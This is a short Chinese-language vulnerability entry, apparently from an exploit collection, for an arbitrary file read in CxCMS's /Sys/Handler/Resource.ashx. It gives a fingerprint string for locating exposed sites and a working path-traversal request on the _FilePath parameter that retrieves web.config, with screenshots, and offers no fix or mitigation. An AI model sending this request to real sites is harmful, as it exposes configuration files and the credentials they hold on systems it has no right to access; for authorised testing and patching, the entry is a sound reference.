# CxCMS Resource.ashx 任意文件读取漏洞

## 漏洞描述

CxCMS 存在任意文件读取，由于 /Sys/Handler/Resource.ashx 页面 _FilePath 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

<a-checkbox checked>CxCMS </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"Powered by CxCms"</a-checkbox></br>

## 漏洞复现

关键字确认CMS

![img](../../../.vuepress/public/img/1635923532626-6348c269-8042-4b83-9296-aac9516db18e.png)

验证POC

```php
/Sys/Handler/Resource.ashx?_FilePath=../../web.config
```

![img](../../../.vuepress/public/img/1635923602690-86a13443-0ef9-4788-8ec6-fad2b601ff7e.png)